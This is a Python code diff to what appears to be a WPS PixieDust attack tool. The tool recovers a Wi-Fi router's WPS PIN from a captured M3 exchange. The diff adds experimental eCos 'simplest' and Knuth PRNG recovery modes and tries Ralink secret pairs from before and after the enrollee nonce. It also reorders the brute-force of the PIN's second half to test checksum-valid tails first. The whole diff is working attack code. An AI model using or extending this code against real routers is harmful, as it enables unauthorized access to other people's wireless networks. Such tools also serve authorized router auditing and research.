@@ -19,7 +19,9 @@ class PixieMode(Enum):
     STATIC_SECRET = auto()
     RALINK = auto()
     RTL819X = auto()
-    ECOS_SIMPLE = auto()   # experimental; not in DEFAULT_MODES (the seed sweep is 2^25)
+    ECOS_SIMPLE = auto() # experimental; not in DEFAULT_MODES (the seed sweep is 2^25)
+    ECOS_SIMPLEST = auto() # experimental; not in DEFAULT_MODES
+    ECOS_KNUTH = auto() # experimental; not in DEFAULT_MODES
 
 
 @dataclass(frozen=True)
@@ -99,6 +101,8 @@ def recover_pin(
     static_secrets: Iterable[SecretPair] = (),
     rtl_window: Optional[Tuple[int, int]] = None,
     ecos_max_counter: int = _ECOS_MAX_COUNTER,
+    ecos_simplest_max_counter: int = 0,
+    ecos_knuth_max_counter: int = 0,
 ) -> PixieResult:
     """Try each PixieDust ``mode`` against a captured M3 ``bundle``; the first full PIN wins. If no
     mode yields a full PIN but one proved a first half, that half is returned to finish online."""
@@ -106,7 +110,10 @@ def recover_pin(
     partial: Optional[Tuple[str, PixieMode]] = None
     secret_pairs = tuple(static_secrets)
     for mode in modes:
-        found = _recover_one(oracle, mode, secret_pairs, rtl_window, ecos_max_counter)
+        found = _recover_one(
+            oracle, mode, secret_pairs, rtl_window, ecos_max_counter,
+            ecos_simplest_max_counter, ecos_knuth_max_counter,
+        )
         if found.pin is not None:
             return PixieResult(pin=found.pin, mode=mode, found=True)
         if found.first_half is not None and partial is None:
@@ -119,6 +126,7 @@ def recover_pin(
 def _recover_one(
     oracle: _HalfOracle, mode: PixieMode, static_secrets: Tuple[SecretPair, ...],
     rtl_window: Optional[Tuple[int, int]], ecos_max_counter: int,
+    ecos_simplest_max_counter: int, ecos_knuth_max_counter: int,
 ) -> _Found:
     if mode is PixieMode.NULL_SECRET:
         return _Found(pin=_recover_with_secret_pair(oracle, NULL_SECRET_PAIR))
@@ -134,6 +142,10 @@ def _recover_one(
         return _recover_rtl819x(oracle, rtl_window)
     if mode is PixieMode.ECOS_SIMPLE:
         return _Found(pin=_recover_ecos_simple(oracle, ecos_max_counter))
+    if mode is PixieMode.ECOS_SIMPLEST and ecos_simplest_max_counter:
+        return _Found(pin=_recover_ecos_simplest(oracle, ecos_simplest_max_counter))
+    if mode is PixieMode.ECOS_KNUTH and ecos_knuth_max_counter:
+        return _Found(pin=_recover_ecos_knuth(oracle, ecos_knuth_max_counter))
     return _Found()
 
 
@@ -146,19 +158,31 @@ def _static_secret_pairs(bundle: PixieBundle) -> Tuple[SecretPair, ...]:
 
 
 def _recover_ralink(oracle: _HalfOracle) -> Optional[str]:
-    """Ralink/MediaTek: rebuild E-S1/E-S2 from the nonce's LFSR state, then brute the PIN halves."""
-    secrets = pixie_prng.ralink_recover(oracle.bundle.e_nonce)
-    if secrets is None:
+    """Try Ralink secret pairs generated both before and after the captured enrollee nonce."""
+    secret_pairs = pixie_prng.ralink_recover_pairs(oracle.bundle.e_nonce)
+    if secret_pairs is None:
         return None
-    return _recover_with_secret_pair(oracle, secrets)
+    for secrets in secret_pairs:
+        pin = _recover_with_secret_pair(oracle, secrets)
+        if pin is not None:
+            return pin
+    return None
 
 
 def _recover_ecos_simple(oracle: _HalfOracle, max_counter: int) -> Optional[str]:
-    """eCos "simple" (experimental): sweep the 25-bit seed for E-S1/E-S2, then brute the halves."""
+    """eCos simple: sweep the 25-bit seed for E-S1/E-S2, then brute the PIN halves."""
     secrets = pixie_prng.ecos_simple_recover(oracle.bundle.e_nonce, max_counter)
-    if secrets is None:
-        return None
-    return _recover_with_secret_pair(oracle, secrets)
+    return _recover_with_secret_pair(oracle, secrets) if secrets is not None else None
+
+
+def _recover_ecos_simplest(oracle: _HalfOracle, max_counter: int) -> Optional[str]:
+    secrets = pixie_prng.ecos_simplest_recover(oracle.bundle.e_nonce, max_counter)
+    return _recover_with_secret_pair(oracle, secrets) if secrets is not None else None
+
+
+def _recover_ecos_knuth(oracle: _HalfOracle, max_counter: int) -> Optional[str]:
+    secrets = pixie_prng.ecos_knuth_recover(oracle.bundle.e_nonce, max_counter)
+    return _recover_with_secret_pair(oracle, secrets) if secrets is not None else None
 
 
 def _recover_rtl819x(oracle: _HalfOracle, rtl_window: Optional[Tuple[int, int]]) -> _Found:
@@ -221,12 +245,18 @@ def _find_first_half(oracle: _HalfOracle, e_s1: bytes) -> Optional[str]:
 
 
 def _find_second_half(oracle: _HalfOracle, e_s2: bytes, first4: str) -> Optional[str]:
-    """The full PIN completing ``first4`` whose PSK2 reproduces E-Hash2 (all 10000 second halves,
-    not just the 1000 checksum-valid ones); ``first4`` itself for an empty zero-length password."""
+    """Find the valid WPS tails first, then accept invalid-checksum tails for broken firmware."""
     e_hash2 = oracle.bundle.e_hash2
     if oracle.matches(e_s2, oracle.empty_psk, e_hash2):
         return first4
+    for middle in range(1_000):
+        tail = pins.full_pin(first4, f"{middle:03d}")[4:]
+        if oracle.matches(e_s2, oracle.psk(int(tail)), e_hash2):
+            return first4 + tail
     for value in range(10_000):
+        tail = f"{value:04d}"
+        if wc.pin_is_valid(first4 + tail):
+            continue
         if oracle.matches(e_s2, oracle.psk(value), e_hash2):
-            return pins.join_halves(first4, f"{value:04d}")
+            return pins.join_halves(first4, tail)
     return None
